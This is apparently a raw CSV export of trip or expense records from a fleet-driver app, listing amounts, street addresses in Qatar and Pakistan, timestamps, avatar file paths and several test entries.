141,20.79,"0.00",,"Al Rayyan, Ar Rayyan, 40466, Qatar",,2022-02-24 14:49:28+00,"",2022-02-24 14:50:05.363916+00,2022-02-24 14:50:05.36393+00,362,1,2017,1,123,1,1
142,"20.90","0.00",,,,2022-02-25 14:41:15+00,"",2022-02-25 14:41:36.279259+00,2022-02-25 14:41:36.279271+00,362,1,2017,1,123,1,1
143,34.57,"0.00",,,,2022-02-27 02:57:34+00,"",2022-02-27 02:57:45.896794+00,2022-02-27 02:57:45.896803+00,362,1,2017,1,123,1,1
127,"27.20","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-19 07:22:48.443505+00,"",2022-02-19 07:23:21.567593+00,2022-02-19 07:23:21.567611+00,552,1,2017,1,9,"0",1
137,"788.00","588.00",naggooooooooo,"463 Dhoke Kala Khan Rd, Awan Colony Dhoke Kala Khan, Rawalpindi, Punjab, Pakistan",bb,2022-02-20 12:02:22+00,avatars/Screenshot_20220220_113807_com.instagram.android.jpg,2022-02-20 12:03:48.826689+00,2022-02-20 12:03:48.826716+00,140,1,2019,1,9,"0",
144,"6700.00","6700.00",final,"M33V+445, Dhoke Kala Khan, Rawalpindi, Punjab, Pakistan",nagina,2022-02-28 01:31:07+00,avatars/JPEG_20220228_063111_3465874854673083407.jpg,2022-02-28 01:31:42.43874+00,2022-02-28 01:31:42.43876+00,535,1,2019,1,9,"0",
277,17.96,"0.00",,"Al Rayyan, Qatar",,2022-05-14 08:47:51+00,"",2022-05-14 08:48:13.584874+00,2022-05-14 08:48:13.584885+00,362,1,2017,1,123,1,1
278,16.41,"0.00",,"Al Shahama Street, Bani Hajer, Al Rayyan, 90089, Qatar",,2022-05-14 09:00:01+00,"",2022-05-14 09:00:16.850362+00,2022-05-14 09:00:16.850376+00,362,1,2017,1,123,1,1
148,"30.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-28 02:57:33.760455+00,"",2022-02-28 02:58:10.132777+00,2022-02-28 02:58:10.132788+00,523,1,2017,1,196,1,1
279,58.79,"0.00",,,,2022-05-15 02:48:27+00,"",2022-05-15 02:48:54.739902+00,2022-05-15 02:48:54.739911+00,362,1,2017,1,123,1,1
280,16.11,"0.00",,,,2022-05-15 03:40:37+00,"",2022-05-15 03:41:01.894378+00,2022-05-15 03:41:01.894389+00,362,1,2017,1,123,1,1
281,22.55,"0.00",,"Street 1106, Al Rayyan, 40466, Qatar",,2022-05-15 05:33:09+00,"",2022-05-15 05:33:37.514174+00,2022-05-15 05:33:37.514184+00,362,1,2017,1,123,1,1
282,"16.90","0.00",,"Umm Salal, Qatar",,2022-05-15 16:29:12+00,"",2022-05-15 16:29:36.042317+00,2022-05-15 16:29:36.042328+00,362,1,2017,1,123,1,1
283,"16.40","0.00",,"Al Rayyan, 40466, Qatar",,2022-05-15 17:17:32+00,"",2022-05-15 17:18:06.175111+00,2022-05-15 17:18:06.175124+00,362,1,2017,1,123,1,1
284,38.77,"0.00",,,,2022-05-17 02:56:33+00,"",2022-05-17 02:56:53.746872+00,2022-05-17 02:56:53.746886+00,362,1,2017,1,123,1,1
285,"46.00","0.00",,"Viva Bahriya, Doha, Qatar",,2022-05-22 05:17:06+00,"",2022-05-22 05:17:31.912347+00,2022-05-22 05:17:31.912358+00,415,1,2017,1,9,1,1
286,"10.00","20.00",Test Driver PVT,"7G8R+FQ3, Doha, Qatar",abc,2022-05-25 00:57:38+00,avatars/415_rDJuLfN.jpeg,2022-05-25 00:58:19.505669+00,2022-05-25 00:58:19.505696+00,415,1,2020,1,9,1,
287,"16.40","0.00",,"Umm Salal, Qatar",,2022-05-28 16:15:44+00,"",2022-05-28 16:15:49.112935+00,2022-05-28 16:15:49.112948+00,362,1,2017,1,123,1,1
288,19.53,"0.00",,,,2022-05-29 03:06:39+00,"",2022-05-29 03:06:41.312059+00,2022-05-29 03:06:41.312069+00,362,1,2017,1,123,1,1
289,49.41,"0.00",,,,2022-05-29 11:22:29+00,"",2022-05-29 11:22:30.344412+00,2022-05-29 11:22:30.344423+00,362,1,2017,1,123,1,1
290,27.05,"0.00",,"Pearl Boulevard, Abraj Quartier, Doha, 23619, Qatar",,2022-06-08 07:23:10.776181+00,"",2022-06-08 07:23:12.035971+00,2022-06-08 07:23:12.035981+00,446,1,2017,1,146,1,1
291,"44.00","0.00",,"Al Rayyan, Qatar",,2022-06-08 07:40:42.394162+00,"",2022-06-08 07:40:43.797309+00,2022-06-08 07:40:43.797325+00,446,1,2017,1,146,1,1
292,"45.00","0.00",,"Al Ebb Street, Al Daayen, 24685, Qatar",,2022-06-08 07:56:49.869909+00,"",2022-06-08 07:56:51.320476+00,2022-06-08 07:56:51.320487+00,446,1,2017,1,146,1,1
293,"45.00","0.00",,,,2022-06-08 08:12:57+00,"",2022-06-08 08:12:57.383832+00,2022-06-08 08:12:57.383843+00,446,1,2017,1,146,1,1
294,"45.00","0.00",,,,2022-06-08 08:29:16+00,"",2022-06-08 08:29:17.475278+00,2022-06-08 08:29:17.475288+00,446,1,2017,1,146,1,1
295,"45.00","0.00",,,,2022-06-08 08:53:16+00,"",2022-06-08 08:53:17.061219+00,2022-06-08 08:53:17.061229+00,446,1,2017,1,146,1,1
296,"45.00","0.00",,,,2022-06-08 09:32:16+00,"",2022-06-08 09:32:17.420636+00,2022-06-08 09:32:17.420646+00,446,1,2017,1,146,1,1
297,"45.00","0.00",,"Pearl Boulevard, Abraj Quartier, Doha, 23619, Qatar",,2022-06-08 10:04:51.132507+00,"",2022-06-08 10:04:52.549531+00,2022-06-08 10:04:52.549543+00,446,1,2017,1,146,1,1
298,"28.70","0.00",,"Abraj Bay Tower 3, Abraj Street, Abraj Quartier, Doha, Qatar",,2022-07-24 10:18:11.735486+00,"",2022-07-24 10:18:13.110331+00,2022-07-24 10:18:13.110341+00,149,1,2017,1,9,"0",1
299,11.55,"0.00",,,,2022-07-24 10:19:48+00,"",2022-07-24 10:19:48.545741+00,2022-07-24 10:19:48.54575+00,149,1,2017,1,9,"0",1
300,11.55,"0.00",,,,2022-07-24 10:21:44+00,"",2022-07-24 10:21:45.001879+00,2022-07-24 10:21:45.001894+00,149,1,2017,1,9,"0",1
246,"48.70","0.00",,"Abraj Quartier, Doha, 23619, Qatar",,2022-04-25 11:44:08.713265+00,"",2022-04-25 11:44:33.914888+00,2022-04-25 11:44:33.914898+00,630,1,2017,1,146,"0",1
301,"41.00","0.00",,"Viva Bahriya Tower 6, Viva Bahriya Drive, Medina Centrale, Doha, Qatar",,2022-08-07 11:24:03+00,"",2022-08-07 11:24:15.832765+00,2022-08-07 11:24:15.832777+00,415,1,2017,1,9,1,1
303,"43.00","322.00",vdfc,vdcr,dfcx,2022-08-12 14:19:21+00,"",2022-08-12 14:19:46.624398+00,2022-08-12 14:19:46.624408+00,596,1,2017,1,146,1,
304,"4532.00","5234324.00",vercsxred,vcewdxwe,vfcrd,2022-08-09 14:38:18+00,"",2022-08-12 14:40:20.070583+00,2022-08-12 14:40:20.070594+00,614,1,2020,1,146,1,
305,"2.00","5.00",A,I10,a,2022-08-15 11:21:19+00,"",2022-08-15 11:24:08.305799+00,2022-08-15 11:24:08.30581+00,734,1,2017,1,146,1,
306,"46.50","0.00",,"Street 180, Costa Malaz, Doha, Qatar",,2022-08-29 13:58:38+00,"",2022-08-29 13:58:43.01407+00,2022-08-29 13:58:43.01408+00,415,1,2017,1,9,1,1
307,"20.00","2000.00",Abc,blue area,Xyz,2022-08-30 10:33:42+00,"",2022-08-30 10:35:56.1785+00,2022-08-30 10:35:56.178509+00,726,1,2017,1,146,1,
309,"5.00","0.00",,"Abraj Bay Tower 3, Abraj Street, Abraj Quartier, Doha, Qatar",,2022-09-08 13:02:25.132408+00,"",2022-09-08 13:02:27.118456+00,2022-09-08 13:02:27.118466+00,678,1,2017,1,9,1,1
310,"8.30","0.00",,,,2022-09-08 13:04:09+00,"",2022-09-08 13:04:10.105901+00,2022-09-08 13:04:10.10591+00,678,1,2017,1,9,1,1
302,"43.00","432.00",vcdxs,rfre,vfcdsx,2022-08-11 14:17:54+00,"",2022-08-12 14:18:02.863364+00,2022-08-12 14:18:02.863381+00,656,1,2020,1,146,"0",
149,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 09:28:30.16449+00,"",2022-02-28 09:28:56.764888+00,2022-02-28 09:28:56.764897+00,577,1,2017,1,9,"0",1
150,"42.00","0.00",,"Islamabad, Punjab",,2022-02-28 09:51:07.334027+00,"",2022-02-28 09:51:30.701186+00,2022-02-28 09:51:30.701197+00,577,1,2017,1,9,"0",1
151,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 09:51:56.337975+00,"",2022-02-28 09:52:26.552404+00,2022-02-28 09:52:26.552414+00,577,1,2017,1,9,"0",1
152,"60.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:19:17.155068+00,"",2022-02-28 10:19:32.665763+00,2022-02-28 10:19:32.665772+00,577,1,2017,1,9,"0",1
153,"57.60","0.00",,"Islamabad, Punjab",,2022-02-28 10:24:20.362276+00,"",2022-02-28 10:24:36.665297+00,2022-02-28 10:24:36.665312+00,577,1,2017,1,9,"0",1
154,"63.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:25:52.130597+00,"",2022-02-28 10:26:04.128062+00,2022-02-28 10:26:04.128076+00,577,1,2017,1,9,"0",1
155,"48.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:32:20.195514+00,"",2022-02-28 10:32:33.392231+00,2022-02-28 10:32:33.392242+00,577,1,2017,1,9,"0",1
156,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:33:47.214487+00,"",2022-02-28 10:34:01.865097+00,2022-02-28 10:34:01.865108+00,577,1,2017,1,9,"0",1
157,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:34:33.322297+00,"",2022-02-28 10:35:00.090726+00,2022-02-28 10:35:00.090736+00,577,1,2017,1,9,"0",1
158,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:35:19.172141+00,"",2022-02-28 10:35:32.2547+00,2022-02-28 10:35:32.25471+00,577,1,2017,1,9,"0",1
174,526.14,"0.00",,"Pearl Boulevard, Unaizah 66",,2022-02-28 11:11:39.088537+00,"",2022-02-28 11:12:01.328238+00,2022-02-28 11:12:01.328248+00,544,1,2017,1,9,"0",1
181,"599.40","0.00",,Azghawa,,2022-02-28 12:17:03.185122+00,"",2022-02-28 12:17:32.214873+00,2022-02-28 12:17:32.214885+00,544,1,2017,1,9,"0",1
182,"599.40","0.00",,Jabal Thuaileb,,2022-02-28 12:33:12.473421+00,"",2022-02-28 12:33:34.240924+00,2022-02-28 12:33:34.240935+00,544,1,2017,1,9,"0",1
183,"599.40","0.00",,,,2022-02-28 12:49:24+00,"",2022-02-28 12:49:39.701481+00,2022-02-28 12:49:39.701489+00,544,1,2017,1,9,"0",1
184,"599.40","0.00",,,,2022-02-28 13:05:31+00,"",2022-02-28 13:06:00.138599+00,2022-02-28 13:06:00.138607+00,544,1,2017,1,9,"0",1
185,"599.40","0.00",,,,2022-02-28 13:21:46+00,"",2022-02-28 13:22:07.273081+00,2022-02-28 13:22:07.273091+00,544,1,2017,1,9,"0",1
186,"599.40","0.00",,,,2022-02-28 13:37:54+00,"",2022-02-28 13:38:10.844805+00,2022-02-28 13:38:10.844814+00,544,1,2017,1,9,"0",1
187,"599.40","0.00",,Unaizah 66,,2022-02-28 13:53:58.292442+00,"",2022-02-28 13:54:30.605811+00,2022-02-28 13:54:30.605821+00,544,1,2017,1,9,"0",1
188,559.44,"0.00",,"Mohammed Bin Thani Street 232, Fereej Bin Omran",,2022-02-28 14:11:32.218754+00,"",2022-02-28 14:12:03.01571+00,2022-02-28 14:12:03.015725+00,544,1,2017,1,9,"0",1
189,"599.40","0.00",,,,2022-02-28 14:27:54+00,"",2022-02-28 14:28:09.271512+00,2022-02-28 14:28:09.271521+00,544,1,2017,1,9,"0",1
190,"532.80","0.00",,"Lusail Street, Al Dafna 61",,2022-02-28 14:56:25.108009+00,"",2022-02-28 14:56:35.709976+00,2022-02-28 14:56:35.70999+00,544,1,2017,1,9,"0",1
191,"599.40","0.00",,Azghawa,,2022-02-28 15:10:56.404508+00,"",2022-02-28 15:11:06.018512+00,2022-02-28 15:11:06.018521+00,544,1,2017,1,9,"0",1
147,"5666.00","66.00",final,"M33V+445, Dhoke Kala Khan, Rawalpindi, Punjab, Pakistan",nagina,2022-02-28 02:28:34+00,avatars/JPEG_20220228_072856_4975703965641943180.jpg,2022-02-28 02:29:34.230291+00,2022-02-28 02:29:34.230326+00,535,1,2017,1,9,"0",
166,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 10:54:07.42105+00,"",2022-02-28 10:54:30.150161+00,2022-02-28 10:54:30.150171+00,577,1,2017,1,9,"0",1
167,"44.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:02:48.411736+00,"",2022-02-28 11:03:02.457429+00,2022-02-28 11:03:02.457443+00,577,1,2017,1,9,"0",1
168,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 11:05:20.028764+00,"",2022-02-28 11:05:34.876624+00,2022-02-28 11:05:34.876633+00,577,1,2017,1,9,"0",1
169,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:06:25.712239+00,"",2022-02-28 11:06:37.991019+00,2022-02-28 11:06:37.991029+00,577,1,2017,1,9,"0",1
170,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:07:30.001535+00,"",2022-02-28 11:07:58.197624+00,2022-02-28 11:07:58.197634+00,577,1,2017,1,9,"0",1
171,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:08:35.48518+00,"",2022-02-28 11:09:00.205398+00,2022-02-28 11:09:00.205408+00,577,1,2017,1,9,"0",1
172,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:09:41.83994+00,"",2022-02-28 11:10:00.922756+00,2022-02-28 11:10:00.922765+00,577,1,2017,1,9,"0",1
173,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:10:47.251591+00,"",2022-02-28 11:11:06.062562+00,2022-02-28 11:11:06.062571+00,577,1,2017,1,9,"0",1
175,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:12:00.183192+00,"",2022-02-28 11:12:28.774356+00,2022-02-28 11:12:28.774366+00,577,1,2017,1,9,"0",1
176,"23.40","0.00",,"Islamabad, Punjab",,2022-02-28 11:13:06.976113+00,"",2022-02-28 11:13:30.330138+00,2022-02-28 11:13:30.330149+00,577,1,2017,1,9,"0",1
177,"39.00","0.00",,"Islamabad, Punjab",,2022-02-28 12:12:25.836502+00,"",2022-02-28 12:12:41.758526+00,2022-02-28 12:12:41.758536+00,577,1,2017,1,9,"0",1
178,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 12:12:52.053206+00,"",2022-02-28 12:13:23.127525+00,2022-02-28 12:13:23.12754+00,577,1,2017,1,9,"0",1
179,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 12:13:08.759673+00,"",2022-02-28 12:13:34.039186+00,2022-02-28 12:13:34.039201+00,577,1,2017,1,9,"0",1
180,"27.00","0.00",,"Islamabad, Punjab",,2022-02-28 12:13:39.099122+00,"",2022-02-28 12:14:05.408338+00,2022-02-28 12:14:05.408353+00,577,1,2017,1,9,"0",1
192,"54.00","0.00",,"Islamabad, Punjab",,2022-02-28 16:06:08.583396+00,"",2022-02-28 16:06:32.650308+00,2022-02-28 16:06:32.650318+00,577,1,2017,1,9,"0",1
193,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 16:08:08.194838+00,"",2022-02-28 16:08:32.786975+00,2022-02-28 16:08:32.78699+00,577,1,2017,1,9,"0",1
194,"45.00","0.00",,"Islamabad, Punjab",,2022-02-28 16:28:55.61989+00,"",2022-02-28 16:29:06.322281+00,2022-02-28 16:29:06.322298+00,577,1,2017,1,9,"0",1
195,"24.00","0.00",,"Islamabad, Punjab",,2022-02-28 16:30:34.553485+00,"",2022-02-28 16:31:02.70479+00,2022-02-28 16:31:02.704808+00,577,1,2017,1,9,"0",1
311,"22.50","0.00",,"5/6 Interchange, Lusail Street, Unaiza, Doha, Qatar",,2022-09-08 13:09:37.563013+00,"",2022-09-08 13:09:38.837126+00,2022-09-08 13:09:38.83714+00,678,1,2017,1,9,1,1
200,"2.00","22.00",g,g,g,2022-02-28 21:41:10+00,"",2022-02-28 21:41:28.474319+00,2022-02-28 21:41:35.519122+00,446,1,2017,1,146,"0",
203,"10.00","25.00",Driver now,"161 Street 58, F-11/4 F 11/4 F-11, Islamabad, Islamabad Capital Territory, Pakistan",me,2022-03-01 01:20:09+00,avatars/Screenshot_2022-03-01-06-19-35-094_qa.vodafone.fleetdriverapp.jpg,2022-03-01 01:20:30.851032+00,2022-03-01 01:24:14.172466+00,446,1,2017,1,146,"0",
205,"16.40","0.00",,,,2022-03-09 03:47:32+00,"",2022-03-09 03:47:51.918354+00,2022-03-09 03:47:51.918363+00,362,1,2017,1,123,1,1
207,24.42,"0.00",,,,2022-03-13 03:33:34+00,"",2022-03-13 03:34:03.685453+00,2022-03-13 03:34:03.685464+00,362,1,2017,1,123,1,1
208,"33.50","0.00",,,,2022-03-14 09:19:01+00,"",2022-03-14 09:19:27.645508+00,2022-03-14 09:19:27.645518+00,362,1,2017,1,123,1,1
209,"20.00","50.00",Jtest,"M22V+JGX, I-10/3 I 10/3 I-10, Islamabad, Islamabad Capital Territory, Pakistan",Majid,2022-03-14 10:00:58+00,avatars/JPEG_20220314_150108_8102275447532520971.jpg,2022-03-14 10:02:59.324454+00,2022-03-14 10:02:59.32448+00,596,1,2017,1,146,1,
210,33.99,"0.00",,,,2022-03-16 08:18:25+00,"",2022-03-16 08:18:40.687271+00,2022-03-16 08:18:40.687284+00,362,1,2017,1,123,1,1
211,15.72,"0.00",,"Highway 490, Al Wakrah, Qatar",,2022-03-16 08:54:28+00,"",2022-03-16 08:55:01.645024+00,2022-03-16 08:55:01.64511+00,362,1,2017,1,123,1,1
212,15.63,"0.00",,,,2022-03-17 11:54:31+00,"",2022-03-17 11:54:55.748074+00,2022-03-17 11:54:55.748085+00,362,1,2017,1,123,1,1
213,17.97,"0.00",,,,2022-03-19 03:23:44+00,"",2022-03-19 03:24:13.96943+00,2022-03-19 03:24:13.969443+00,362,1,2017,1,123,1,1
214,15.52,"0.00",,,,2022-03-20 04:00:25+00,"",2022-03-20 04:00:59.164266+00,2022-03-20 04:00:59.164277+00,362,1,2017,1,123,1,1
215,26.37,"0.00",,,,2022-03-21 03:53:35+00,"",2022-03-21 03:53:55.522292+00,2022-03-21 03:53:55.522302+00,362,1,2017,1,123,1,1
216,"21.70","0.00",,,,2022-03-21 11:38:02+00,"",2022-03-21 11:39:15.623209+00,2022-03-21 11:39:15.623224+00,362,1,2017,1,123,1,1
217,"2908.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-03-23 01:21:32.399623+00,"",2022-03-23 01:21:59.570162+00,2022-03-23 01:21:59.570178+00,615,1,2017,1,3,1,1
218,"2908.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-03-23 01:22:38.992013+00,"",2022-03-23 01:23:01.233213+00,2022-03-23 01:23:01.233229+00,615,1,2017,1,3,1,1
219,"2908.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-03-23 01:23:45.320164+00,"",2022-03-23 01:24:01.564766+00,2022-03-23 01:24:01.56478+00,615,1,2017,1,3,1,1
220,"2908.80","0.00",,"G-6/4, G-5, Blue Area, Islamabad Capital Territory, 44000, Pakistan",,2022-03-23 01:24:51.789731+00,"",2022-03-23 01:25:05.059549+00,2022-03-23 01:25:05.059567+00,615,1,2017,1,3,1,1
221,"2908.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-03-23 01:26:32.536474+00,"",2022-03-23 01:26:59.81275+00,2022-03-23 01:26:59.812761+00,615,1,2017,1,3,1,1
222,"2908.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-03-23 01:27:39.328565+00,"",2022-03-23 01:28:00.387189+00,2022-03-23 01:28:00.3872+00,615,1,2017,1,3,1,1
223,"2908.80","0.00",,"COMSATS Islamabad, Constitution Avenue, G-5, Islamabad, Islamabad Capital Territory, 4400, Pakistan",,2022-03-23 01:28:46.012938+00,"",2022-03-23 01:29:01.381814+00,2022-03-23 01:29:01.381826+00,615,1,2017,1,3,1,1
224,"2908.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-03-23 01:29:52.426009+00,"",2022-03-23 01:30:04.296759+00,2022-03-23 01:30:04.296774+00,615,1,2017,1,3,1,1
225,"2908.80","0.00",,"Islamabad College For Boys, Street 8, G-6/3, G-6, Islamabad, Islamabad Capital Territory, 4400, Pakistan",,2022-03-23 01:31:32.518178+00,"",2022-03-23 01:32:00.269829+00,2022-03-23 01:32:00.26984+00,615,1,2017,1,3,1,1
226,"2908.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-03-23 01:32:39.18492+00,"",2022-03-23 01:33:00.947981+00,2022-03-23 01:33:00.947994+00,615,1,2017,1,3,1,1
227,"2908.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-03-23 01:33:45.754937+00,"",2022-03-23 01:34:01.264468+00,2022-03-23 01:34:01.264484+00,615,1,2017,1,3,1,1
196,"2448.60","0.00",,"Islamabad, Punjab",,2022-02-28 21:26:51.819023+00,"",2022-02-28 21:27:07.570613+00,2022-02-28 21:27:07.570623+00,581,1,2017,1,9,"0",1
197,"932.80","0.00",,"Islamabad, Punjab",,2022-02-28 21:28:58.843313+00,"",2022-02-28 21:29:07.738582+00,2022-02-28 21:29:07.738592+00,581,1,2017,1,9,"0",1
199,"2915.00","0.00",,"Islamabad, Punjab",,2022-02-28 21:36:47.360986+00,"",2022-02-28 21:37:07.717547+00,2022-02-28 21:37:07.717558+00,581,1,2017,1,9,"0",1
198,"789677.00","6788899.00",final,"M33V+445, Dhoke Kala Khan, Rawalpindi, Punjab, Pakistan",nagina,2022-03-01 21:36:31+00,avatars/IMG-20220301-WA0000.jpg,2022-02-28 21:36:59.299714+00,2022-02-28 21:36:59.299739+00,535,1,2020,1,9,"0",
202,"10.00","10.00",Marwan Hazman,"7G8R+FQ3, Doha, Qatar",Marwan,2022-03-01 01:15:51+00,avatars/415.jpeg,2022-03-01 01:16:18.781634+00,2022-04-24 08:28:25.413005+00,415,1,2017,1,9,1,
204,"58.00","88.00",Marwan Hazman,"7G8V+5VR, Doha, Qatar",g,2022-03-01 01:23:11+00,avatars/IMG_20210922_140032.jpg,2022-03-01 01:22:59.937459+00,2022-04-24 08:28:44.828945+00,307,1,2017,1,9,1,
206,"45.00","90.00",Marwan Hazman,"Giardino Drive, Costa Malaz, Doha, 220045, Qatar",Marwan,2022-03-12 17:40:18+00,"",2022-03-12 17:40:33.406696+00,2022-04-24 08:29:07.372333+00,415,1,2017,1,9,1,1
228,"2908.80","0.00",,"Avari Towers Islamabad, Shaheed-e-Millat Road, G-6, Islamabad, Islamabad Capital Territory, 4400, Pakistan",,2022-03-23 01:34:54.573707+00,"",2022-03-23 01:35:02.294502+00,2022-03-23 01:35:02.294517+00,615,1,2017,1,3,1,1
229,"2908.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-03-23 01:36:43.569102+00,"",2022-03-23 01:37:01.330423+00,2022-03-23 01:37:01.330438+00,615,1,2017,1,3,1,1
230,"2908.80","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-03-23 01:37:52.227765+00,"",2022-03-23 01:38:03.644573+00,2022-03-23 01:38:03.64459+00,615,1,2017,1,3,1,1
231,"2908.80","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-03-23 01:38:59.254155+00,"",2022-03-23 01:39:29.981069+00,2022-03-23 01:39:29.981084+00,615,1,2017,1,3,1,1
232,29.76,"0.00",,"Abraj Quartier, Doha, 23619, Qatar",,2022-04-11 06:28:32.450417+00,"",2022-04-11 06:28:54.837474+00,2022-04-11 06:28:54.837515+00,596,1,2017,1,146,1,1
233,45.99,"0.00",,,,2022-04-15 03:17:49+00,"",2022-04-15 03:18:13.634995+00,2022-04-15 03:18:13.635006+00,362,1,2017,1,123,1,1
234,21.78,"0.00",,"Street 1106, Al Rayyan, 40466, Qatar",,2022-04-15 04:48:13+00,"",2022-04-15 04:48:46.170113+00,2022-04-15 04:48:46.170126+00,362,1,2017,1,123,1,1
235,17.88,"0.00",,"Street 1110, Al Rayyan, 40466, Qatar",,2022-04-15 04:50:04+00,"",2022-04-15 04:50:22.019173+00,2022-04-15 04:50:22.019185+00,362,1,2017,1,123,1,1
236,36.72,"0.00",,,,2022-04-16 03:14:12+00,"",2022-04-16 03:14:31.983911+00,2022-04-16 03:14:31.983926+00,362,1,2017,1,123,1,1
237,17.28,"0.00",,"Street 1110, Al Rayyan, 40466, Qatar",,2022-04-17 06:45:20+00,"",2022-04-17 06:45:54.660529+00,2022-04-17 06:45:54.660539+00,362,1,2017,1,123,1,1
238,44.34,"0.00",,,,2022-04-17 15:57:43+00,"",2022-04-17 15:58:04.675987+00,2022-04-17 15:58:04.675998+00,362,1,2017,1,123,1,1
239,58.11,"0.00",,,,2022-04-19 15:35:14+00,"",2022-04-19 15:35:39.471987+00,2022-04-19 15:35:39.471999+00,362,1,2017,1,123,1,1
240,62.31,"0.00",,,,2022-04-21 15:29:11+00,"",2022-04-21 15:29:22.708411+00,2022-04-21 15:29:22.708421+00,362,1,2017,1,123,1,1
241,20.61,"0.00",,"Bu Samra Street, Al Rayyan, 40466, Qatar",,2022-04-21 16:54:40+00,"",2022-04-21 16:55:03.459619+00,2022-04-21 16:55:03.459636+00,362,1,2017,1,123,1,1
242,"21.40","0.00",,"Al Rayyan, 40466, Qatar",,2022-04-21 16:56:04+00,"",2022-04-21 16:56:28.567906+00,2022-04-21 16:56:28.567917+00,362,1,2017,1,123,1,1
243,19.83,"0.00",,"Street 1106, Al Rayyan, 40466, Qatar",,2022-04-22 05:05:42+00,"",2022-04-22 05:06:01.312756+00,2022-04-22 05:06:01.312767+00,362,1,2017,1,123,1,1
244,19.05,"0.00",,"Street 1110, Al Rayyan, 40466, Qatar",,2022-04-22 05:07:46+00,"",2022-04-22 05:07:59.772733+00,2022-04-22 05:07:59.772744+00,362,1,2017,1,123,1,1
245,65.72,"0.00",,,,2022-04-24 02:32:48+00,"",2022-04-24 02:33:08.286432+00,2022-04-24 02:33:08.286443+00,362,1,2017,1,123,1,1
128,"27.20","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-19 07:23:35.103495+00,"",2022-02-19 07:24:04.212298+00,2022-02-19 07:24:04.212316+00,552,1,2017,1,9,"0",1
129,"64.60","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-19 07:32:56.602204+00,"",2022-02-19 07:33:27.674688+00,2022-02-19 07:33:27.674701+00,552,1,2017,1,9,"0",1
130,"37.40","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-19 07:40:39.260245+00,"",2022-02-19 07:41:10.300074+00,2022-02-19 07:41:10.300093+00,552,1,2017,1,9,"0",1
132,"64.60","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-19 17:41:10.576257+00,"",2022-02-19 17:41:50.912626+00,2022-02-19 17:41:50.912637+00,552,1,2017,1,9,"0",1
133,"27.20","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-19 17:42:37.384383+00,"",2022-02-19 17:43:04.832683+00,2022-02-19 17:43:04.832694+00,552,1,2017,1,9,"0",1
134,"100.00","100.00",nagina prod mirror,islamabad,test,2022-02-20 09:48:38+00,avatars/552.jpeg,2022-02-20 09:49:02.394742+00,2022-02-20 09:49:02.394784+00,552,1,2017,1,9,"0",
135,"80000.00","80000.00",nagina prod mirror,islamabad,test,2022-02-20 09:51:11+00,avatars/552_Hc4E23Q.jpeg,2022-02-20 09:51:36.665936+00,2022-02-20 09:51:36.665959+00,552,1,2017,1,9,"0",
136,"80000.00","80000.00",nagina prod mirror,"M6X8+9PG, Bahria Enclave, Malot, Islamabad, Islamabad Capital Territory, Pakistan",testing,2022-02-20 09:58:45+00,avatars/552_D5euZhA.jpeg,2022-02-20 09:59:05.637286+00,2022-02-20 09:59:05.637311+00,552,1,2017,1,9,"0",
201,"2215.40","0.00",,"Islamabad, Punjab",,2022-02-28 21:44:38.044831+00,"",2022-02-28 21:45:07.206495+00,2022-02-28 21:45:07.206504+00,581,1,2017,1,9,"0",1
247,52.63,"0.00",,,,2022-04-26 02:47:30+00,"",2022-04-26 02:47:47.834394+00,2022-04-26 02:47:47.834407+00,362,1,2017,1,123,1,1
258,18.65,"0.00",,"Umm Salal, Qatar",,2022-04-27 03:34:11+00,"",2022-04-27 03:34:40.032667+00,2022-04-27 03:34:40.032677+00,362,1,2017,1,123,1,1
